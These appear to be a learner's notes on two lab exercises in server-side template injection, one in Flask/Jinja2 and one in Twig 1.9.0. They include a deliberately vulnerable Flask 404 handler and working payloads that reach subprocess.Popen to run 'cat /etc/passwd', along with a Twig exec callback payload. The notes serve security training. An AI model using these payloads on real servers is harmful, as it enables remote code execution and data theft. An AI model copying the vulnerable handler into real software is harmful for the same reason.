# Essential: Server Side Template Injection 01

* This exercise was inspired by the following Hackerone report: [`https://hackerone.com/reports/125980`](https://hackerone.com/reports/125980) . In this exercise, the bug is located in the `404 error management`.

* This report gives you the foundation to:

	* Test `{{'7'*7}}`

	* Get code execution:

`{{''.__class__.mro()[1].__subclasses__()}}`  

* `mro` is `Method Resolution Order` (have a look at my python programming notes for details.)

* Check the report carefully, as you can see that the `__` are hidden due to the processing of the data as `Markdown` .

* You may need to change the value `1` to get the list of interesting functions. Once you get it, you will need to find one that will give you `code execution`. You can use the following `payload` to get access to `<class 'subprocess.Popen'>:`


* `{{''.__class__.mro()[1].__subclasses__()[X]}}`

	* Where X is the integer you need to find.

* Finally, you can call this method using:

* `{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}`

	* Where:

		* `X` was found previously.

		* `COMMAND` is the command you want to run.

* Make sure you read the `Python` documentation for the `popen` to make sure you have get the right syntax for the command (or add the right option)

* You can access this exercise using the following URL: [http://ptl-726bac62-f10108a9.libcurl.so/](http://ptl-726bac62-f10108a9.libcurl.so/) .

```python
from flask import Flask, redirect, render_template_string, render_template, request
app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% block body %%}
    <div class="center-content error">
        <h1>Page not Found: %s</h1>
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template), 404


@app.route('/')
def index():
  return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False,host='0.0.0.0')
```
* you can inject following payload to the end of url.
```
{{"".__class__.mro()[-1].__subclasses__()[233]("cat /etc/passwd",shell=True,stdout=-1).communicate()[0]}}`
```

* [http://ptl-4a98de06-83a4f43f.libcurl.so/%7B%7B%22%22.__class__.mro()[-1].__subclasses__()[233](%22cat%20/etc/passwd%22,shell=True,stdout=-1).communicate()[0]%7D%7D](http://ptl-4a98de06-83a4f43f.libcurl.so/%7B%7B%22%22.__class__.mro()[-1].__subclasses__()[233](%22cat%20/etc/passwd%22,shell=True,stdout=-1).communicate()[0]%7D%7D)

* you can run the interactive shell with script that i have build in python to inject code for this excersice.


# Essential: Server Side Template Injection 02

* This challenge covers the exploitation of a `Server Side Template Injection` in an old version of `Twig` (1.9.0).

* This issue can be used to gain code execution on the server. To get code execution you need to find a way to execute command using the functions offered by the template. Fortunately, the following code can be used:

* `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`
Using this code, you should be able to score this exercise.

* You can access this exercise using the following URL: [http://ptl-eff86bbb-00f98bd9.libcurl.so/](http://ptl-eff86bbb-00f98bd9.libcurl.so/) .

* you can run the script that i have implemented for interactive injection shell.